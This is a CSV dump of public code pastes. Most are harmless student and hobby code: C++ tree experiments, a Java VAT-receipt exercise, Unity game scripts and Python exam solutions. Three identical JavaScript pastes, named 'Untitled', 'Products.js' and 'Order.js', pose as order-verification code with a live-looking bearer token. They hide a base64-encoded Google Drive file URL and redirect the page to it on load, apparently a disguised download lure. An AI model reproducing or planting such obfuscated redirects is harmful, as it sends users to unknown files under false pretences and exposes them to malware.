id,title,username,language,date,content
v14L713X,tree8,Korotkodul,C++,Saturday 12th of April 2025 04:47:28 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        cout << ""creating\n"";
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        cout << root.val << ""\n"";
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            root.val = this->arr[(Ri + Li) / 2 + 1];
            cout << ""change val: "" << root.val << ""\n"";
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        cout << ""\n"";
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    /*node find_first(node  v) {
        node res = v;
        while (v.l != nullptr) {
            res = &(res.l);
        }
        return res;
    }
    node find_next(node v) {
        return;
    }*/
    void trav(node root) {
        cout << ""trav\n"";
        cout << root.val << ""\n"";
        if (root.l == nullptr && root.r == nullptr) {
            cout << root.val << "" "";
            return;
        }
        if (root.l != nullptr) {
            trav(*(root.l));
        }
        cout << root.val << "" "";
        if (root.r != nullptr) {
            trav(*(root.r));
        }
    }
    void insert_after(node v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    cout << ""TRAVERSAL ORDER\n"";
    T.trav(T.main_root);
}

"
sXSFySNx,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 04:44:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23040/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FHDGDPLX,tree6,Korotkodul,C++,Saturday 12th of April 2025 04:35:57 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    /*node find_first(node  v) {
        node res = v;
        while (v.l != nullptr) {
            res = &(res.l);
        }
        return res;
    }
    node find_next(node v) {
        return;
    }*/
    void trav(node root) {
        cout << ""trav\n"";
        cout << root.val << ""\n"";
        if (root.self == nullptr) {
            return;
        }
        if (root.l == nullptr && root.r == nullptr) {
            cout << root.val << "" "";
            return;
        }
        trav(*(root.l));
        cout << root.val << "" "";
        trav(*(root.l));
    }
    void insert_after(node v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    cout << ""TRAVERSAL ORDER\n"";
    T.trav(T.main_root);
}

"
SBWJ6qxR,[NP] MojDDV,dzocesrce,Java,Saturday 12th of April 2025 04:35:56 AM CDT,"import java.io.*;
import java.util.ArrayList;
import java.util.DoubleSummaryStatistics;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;
import java.util.Arrays;
import java.util.Comparator;


public class MojDDVTest {

    public static void main(String[] args) {

        MojDDV mojDDV = new MojDDV();

        //In IntelliJ we must use CTRL+D in order to break the INPUT STREAM.
        System.out.println(""===READING RECORDS FROM INPUT STREAM==="");
        mojDDV.readRecords(System.in);

        System.out.println(""===PRINTING TAX RETURNS RECORDS TO OUTPUT STREAM ==="");
        mojDDV.printTaxReturns(System.out);

        System.out.println(""===PRINTING SUMMARY STATISTICS FOR TAX RETURNS TO OUTPUT STREAM==="");
        mojDDV.printStatistics(System.out);

    }
}

class MojDDV {

    private List<Receipt> receipts;

    public MojDDV() {
        receipts= new ArrayList<Receipt>();
    }

    //for every line we try to make a receipt, if it throws an exception we simply mark it as null.
    //then we filter out the null objects and collect them into a list, which represents the receipts of the actual MojDDV object.
    public void readRecords(InputStream in) {
        this.receipts = new BufferedReader(new InputStreamReader(in))
                .lines()
                .map(i -> {
                    try {
                        return Receipt.createReceipt(i);
                    } catch (AmountNotAllowedException e) {
                        System.out.println(e.getMessage());
                        return null;
                    }
                })
                .filter(Objects::nonNull)
                .collect(Collectors.toList());


    }

    //First we sort the receipts and then we print every single one.
    public void printTaxReturns(OutputStream out) {

        PrintWriter printWriter = new PrintWriter(out);

        this.receipts.stream().
               // sorted().
                forEach(i -> printWriter.println(i));

        printWriter.flush();
    }

    //if we need statistics such as min,max,avg... we can use the
    // DoubleSummaryStatistcs class that generates them for our data.
    public void printStatistics(OutputStream out) {
        PrintWriter printWriter = new PrintWriter(out);
        DoubleSummaryStatistics summaryStatistics = receipts.stream()
                        .mapToDouble(i-> i.taxReturns())
                                .summaryStatistics();

        printWriter.format(""min:\t%.3f\nmax:\t%.3f\nsum:\t%.3f\ncount:\t%d\navg:\t%.3f\n"",
                summaryStatistics.getMin(),
                summaryStatistics.getMax(),
                summaryStatistics.getSum(),
                summaryStatistics.getCount(),
                summaryStatistics.getAverage());

        printWriter.flush();
    }
}

class Receipt implements Comparable<Receipt> {
    private long id;
    private List<Item> items;

    public Receipt(long id) {
        this.id = id;
        this.items = new ArrayList<>();
    }

    public Receipt(long id, List<Item> items) {
        this.id = id;
        this.items = items;
    }

    //We create objects through this method where we cut down the input line.
    //We through an exception which we try and match in the readData method.
    public static Receipt createReceipt(String line) throws AmountNotAllowedException {
    String[] parts= line.split(""\\s+"");
    long id= Long.parseLong(parts[0]);

    List<Item> items = new ArrayList<>();

        Arrays.stream(parts)
                .skip(1)
                .forEach(i -> {
                    if(Character.isDigit(i.charAt(0))){
                        items.add(new Item(Integer.parseInt(i)));
                    }
                    else{
                        items.get(items.size()-1).setTaxType(TaxType.valueOf(i));
                    }
                });
        if(totalAmount(items)>30000)
            throw new AmountNotAllowedException(totalAmount(items));

        return new Receipt(id,items);
    }

    //We get all the items into a stream and map to Int or Double their adequate amount, and then we sum them all.
    public static int totalAmount(List<Item> items){
        return items.stream().mapToInt(i -> i.getAmount()).sum();
    }
    public int totalAmount(){
        return items.stream().mapToInt(i -> i.getAmount()).sum();
    }

    public double taxReturns(){
        return items.stream().mapToDouble(i -> i.getTaxReturn()).sum();
    }

    //We compare the order of listing/sorting for 2 receipts, first through their taxReturn,
    // and then through their totalAmount attribute.
    @Override
    public int compareTo(Receipt other) {
        return Comparator.comparing(Receipt::taxReturns)
                .thenComparing(Receipt::totalAmount)
                .compare(this,other);
    }

    @Override
    public String toString() {
        return String.format(""%10d\t%10d\t%10.5f"",id,totalAmount(),taxReturns());
    }
}

class Item {
    private int amount;
    private TaxType taxType;
    private static double TAX_V=0.0;
    private static double TAX_A=0.18;
    private static double TAX_B=0.05;

    public Item(int amount) {
        this.amount = amount;
    }

    public double getTaxReturn(){
        if(taxType==TaxType.V)
            return 0.15*amount*TAX_V;
        else if(taxType==TaxType.B)
            return 0.15*amount*TAX_B;
        else
            return 0.15*amount*TAX_A;
    }

    public int getAmount() {
        return amount;
    }

    public void setAmount(int amount) {
        this.amount = amount;
    }

    public TaxType getTaxType() {
        return taxType;
    }

    public void setTaxType(TaxType taxType) {
        this.taxType = taxType;
    }
}

enum TaxType {
    A,
    B,
    V
}

class AmountNotAllowedException extends Exception{
    public AmountNotAllowedException(int totalAmount) {
        super(String.format(""Receipt with amount %d is not allowed to be scanned"",totalAmount));
    }
}"
iiB8qK3P,Untitled,gandalfbialy,C#,Saturday 12th of April 2025 04:32:46 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
public class WinPlace : MonoBehaviour
{
    float alfa = 0;
    void FixedUpdate()
    {
        float scale = Resizer();
        transform.localScale = new Vector3(scale, 4.5f, scale);
    }
    public float Resizer()
    {
        float value = Mathf.Sin(alfa);
        alfa += (1.5f * Time.deltaTime);
        return value + 2f;
    }
    private void OnTriggerEnter(Collider other)
    {
        if (other.gameObject.tag == ""Player"")
        {
            GameManager.gameManager.WinGame();
        }
    }
}"
kt1GceBH,Products.js,WantingTrae,JavaScript,Saturday 12th of April 2025 04:29:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88017/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hCsiebfn,Untitled,gandalfbialy,C#,Saturday 12th of April 2025 04:24:25 AM CDT,"using System.Collections;
using System.Collections.Generic;
using System.Net.Sockets;
using UnityEngine;

public class Lock : MonoBehaviour
{
    bool canOpen = false;
    public Door[] doors;
    public KeyColor keyColor;
    public bool isLocked = false;
    Animator key;

    // Start is called before the first frame update
    void Start()
    {
        key = GetComponent<Animator>();
    }

    // Update is called once per frame
    void Update()
    {
        if (canOpen && !isLocked)
        {
            GameManager.gameManager.SetUseInfo(""Press E to open lock"");
        }

        if (Input.GetKeyDown(KeyCode.E) && canOpen && !isLocked)
        {
            key.SetBool(""useKey"", CheckTheKey());
        }
    }

    public void UseKey()
    {
        foreach (Door door in doors)
        {
            door.Open();
        }
    }

    public bool CheckTheKey()
    {
        if (GameManager.gameManager.redKey > 0 && keyColor == KeyColor.Red)
        {
            GameManager.gameManager.redKey--;
            GameManager.gameManager.redKeyText.text = GameManager.gameManager.redKey.ToString();

            isLocked = true;
            return true;
        }
        else if (GameManager.gameManager.greenKey > 0 && keyColor == KeyColor.Green)
        {
            GameManager.gameManager.greenKey--;
            GameManager.gameManager.greenKeyText.text = GameManager.gameManager.greenKey.ToString();

            isLocked = true;
            return true;
        }
        else if (GameManager.gameManager.goldKey > 0 && keyColor == KeyColor.Gold)
        {
            GameManager.gameManager.goldKey--;
            GameManager.gameManager.goldKeyText.text = GameManager.gameManager.goldKey.ToString();

            isLocked = true;
            return true;
        }
        else
        {
            Debug.Log(""Nie masz klucza!"");
            return false;
        }
    }

    private void OnTriggerEnter(Collider other)
    {
        if (other.CompareTag(""Player""))
        {
            canOpen = true;
            Debug.Log(""You can open the door now!"");
        }
    }

    private void OnTriggerExit(Collider other)
    {
        if (other.CompareTag(""Player""))
        {
            canOpen = false;
            GameManager.gameManager.SetUseInfo("""");

            Debug.Log(""You can not open the door :("");
        }
    }
}"
VwrZr7Zr,红黑树 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 04:23:56 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 10 + 100;
int n, row, col;

int dfs(int row, int col) {
    if (row == 0) {
        return 0;
    }
    int tmp = dfs(row - 1, col >> 1);
    if (col & 1) {
        tmp ^= 1;
    }
    return tmp;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    cin >> n;
    while (n--) {
        cin >> row >> col;
        int ans = dfs(row - 1, col - 1);
        cout << (ans == 0 ? ""RED"" : ""BLACK "") << endl;
    }

    return 0;
}
"
z5DzM7j6,14 5 неизвестных,nq1s788,Python,Saturday 12th of April 2025 04:15:27 AM CDT,"#1 https://inf-ege.sdamgia.ru/test?id=18072637&nt=True&pub=False
for p in range(9, 25):
    for x in range(p):
        for y in range(p):
            for z in range(p):
                for w in range(p):
                    if z * p**4 + x * p**3 + y * p**2 + x * p + 4 + x * p**4 + y * p**3 + 6 * p**2 + 5 * p + 8 == w * p**4 + z * p**3 + x * p**2 + 7 * p + 3:
                        print(x * p**3 + y * p**2 + z * p + w)"
Tc2a3LMj,Order.js,WantingTrae,JavaScript,Saturday 12th of April 2025 04:14:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47037/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
L6CWDj6L,tree5,Korotkodul,C++,Saturday 12th of April 2025 04:11:12 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    node find_first(node  v) {
        res = v;
        while (v.l != nullptr) {
            res = v.l;
        }
        return res;
    }
    node find_next(node v) {
        return;
    }
    void output() {

        return;
    }
    void insert_after(node v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    T.output();
}

"
Hsi28Rb4,抽奖 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 04:09:48 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 1000 + 100;
int n, m, ans;
int x[3], idx[3], num[3];
int a[3][maxn];

int cal() {
    if (num[0] == num[1] - 1 && num[1] == num[2] - 1) {
        return 200;
    }
    if (num[0] == num[1] && num[1] == num[2]) {
        return 200;
    }
    sort(num, num + 3);
    if (num[0] == num[1] - 1 && num[1] == num[2] - 1) {
        return 100;
    }
    if (num[0] == num[1] || num[1] == num[2]) {
        return 100;
    }
    return 0;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    cin >> n;
    for (int i = 0; i < 3; ++i) {
        for (int j = 0; j < n; ++j) {
            cin >> a[i][j];
        }
    }
    cin >> m;
    for (int i = 0; i < m; ++i) {
        for (int j = 0; j < 3; ++j) {
            cin >> x[j];
            idx[j] = (idx[j] + x[j]) % n;
            num[j] = a[j][idx[j]];
        }
        ans += cal();
    }
    cout << ans << endl;

    return 0;
}
"
KCRsKwNj,Auto_klasa,cuniszkiewicz,C#,Saturday 12th of April 2025 04:08:10 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace OOP_1N122L_IS_SK_lato_2025
{
    public class Auto
    {
        //pola
        public string marka;
        public string model;
        private int predkoscMaksymalna;
        public double pojemnoscSilnika;


        //metody
        public void Opis()
        {
            Console.WriteLine($""Auto: {marka} {model}, "" +
                    $""prędkość maksymalna: {predkoscMaksymalna}km/h,"" +
                    $""pojemność skokowa silnika to {pojemnoscSilnika}ccm"");

        }


        public double PoliczCzasPrzejazdu(int kilometry)
        {
            double czas = 0;

            if (predkoscMaksymalna > 0)
                czas = (double)kilometry / predkoscMaksymalna;

            return czas;
        }

        //konstruktory

        public Auto()
        {
            marka = ""Fiat"";
            model = ""Punto"";
            predkoscMaksymalna = 180;
            pojemnoscSilnika = 1199;
        }

        public Auto(string _marka, string _model, int _predkoscMaksymalna = 180, double _pojemnoscSilnika = 1199)
        {
            marka = _marka;
            model = _model;
            predkoscMaksymalna = _predkoscMaksymalna;
            pojemnoscSilnika = _pojemnoscSilnika;
        }

        public Auto(Auto autoWzorcowe)
        {
            marka = autoWzorcowe.marka;
            model = autoWzorcowe.model;
            predkoscMaksymalna = autoWzorcowe.predkoscMaksymalna;
            pojemnoscSilnika = autoWzorcowe.pojemnoscSilnika;
        }

        //metody ustawiające

        public void UstawPredkoscMaksymalna(int _predkosc)
        {
            if (_predkosc >= 20)
                predkoscMaksymalna = _predkosc;
            else
                predkoscMaksymalna = 20;
        }

        public int WezPredkoscMaksymalna()
        { 
            return predkoscMaksymalna;
        }

        //Właściwości
        public int PredkoscMaksymalna
        {
            get { return predkoscMaksymalna; }
            set
            {
                if (value >= 20 && value < 400)
                    predkoscMaksymalna = value;
                else
                    predkoscMaksymalna = 20;
            }
        }

        private double temperaturaOleju;

        public double TemperaturaOlejuC
        {
            get { return temperaturaOleju; }
            set { 
                if (value > 0 && value < 140)
                    temperaturaOleju = value; 
                else
                    temperaturaOleju = 90;
            }
        }
        public double TemperaturaOlejuK
        {
            get { return temperaturaOleju + 273.15; }
            set
            {
                if (value > 273.15 && value < 413.15)
                    temperaturaOleju = value - 273.15;
                else
                    temperaturaOleju = 90;
            }
        }

    }

    internal class Program
    {
        static void Main(string[] args)
        {
            Auto auto = new Auto();
            Auto auto2 = new Auto();
            Auto auto3 = new Auto(""VW"",""Golf"",210,1998);
            Auto auto4 = new Auto(""Mazda"", ""6"");


            auto.marka = ""Ferrari"";
            auto.model = ""F40"";
            //auto.predkoscMaksymalna = 350;
            //auto.UstawPredkoscMaksymalna(300);
            auto.PredkoscMaksymalna = 350;
            auto.pojemnoscSilnika = 5999;

            Auto auto5 = new Auto(auto);
            
            
            auto.Opis();
            /*
            auto2.Opis();
            auto3.Opis();
            auto4.Opis();
            auto5.Opis();
            */
            /*
            Console.WriteLine($""Auto {auto.marka} {auto.model} "" +
                $""potrzebuje: {auto.PoliczCzasPrzejazdu(500)} godziny do przejachania 500km"");
            */

            Console.WriteLine($""Prędkość maksymalna auta {auto.model} to: {auto.PredkoscMaksymalna}km/h"");

            auto.TemperaturaOlejuC = 100;
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuC} C"");
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuK} K"");
            auto.TemperaturaOlejuK = 373.15;
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuC} C"");
            Console.WriteLine($""Temperatura oleju w aucie to: {auto.TemperaturaOlejuK} K"");


            Console.ReadKey();


        }
    }
}
"
YzCRWpdW,tree4,Korotkodul,C++,Saturday 12th of April 2025 04:08:06 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    void output() {

        return;
    }
    void find_first(int*  v) {
        return;
    }
    void find_nex(int* v) {
        return;
    }
    void insert_after(int* v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    T.output();
}

"
JiASaW30,19 20 21 две кучи странные,nq1s788,Python,Saturday 12th of April 2025 04:07:13 AM CDT,"#19 20 21 https://inf-ege.sdamgia.ru/test?id=17982110
from functools import lru_cache


def moves(h):
    ret = []
    x, y = h
    if y < x:
        x, y = y, x
    for add in range(1, x + 1):
        ret.append((x + add, y))
    return ret


@lru_cache(None)
def game(h):
    if sum(h) > 39:
        return 'WIN'
    elif any(game(m) == 'WIN' for m in moves(h)):
        return 'P1'
    elif all(game(m) in ['P1'] for m in moves(h)):
        return 'V1'
    elif any(game(m) == 'V1' for m in moves(h)):
        return 'P2'
    elif all(game(m) in ['P1', 'P2'] for m in moves(h)):
        return 'V2'


def p19(h):
    return any(game(m) == 'P1' for m in moves(h))


a19 = 100000000
for fi in range(1, 39):
    for se in range(fi, 39):
        if fi + se > 39:
            continue
        if game((fi, se)) == 'P1':
            a19 = min(a19, fi+se)
print(a19)

#print([s for s in range(1, 72) if p19((14, s))]) #ваня выиграл первым ходом
print([s for s in range(1, 36) if game((4, s)) == 'P2']) #петя вторым ходом
print([s for s in range(1, 36) if game((4, s)) == 'V2'])
"
